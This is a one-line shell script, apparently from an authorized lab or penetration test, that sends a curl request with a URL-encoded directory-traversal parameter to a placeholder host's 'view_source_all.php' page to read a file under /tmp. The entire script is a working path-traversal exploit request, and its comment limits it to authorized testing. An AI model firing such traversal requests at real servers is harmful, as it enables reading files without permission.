#!/usr/bin/env sh
set -eu
# 仅限授权测试；替换 TARGET 后手动执行
curl -sS -i -X GET 'http://TARGET:8080/vulnerabilities/view_source_all.php?id=..%2F..%2F..%2F..%2Ftmp%2Fsunset_LLM86bd7.txt'
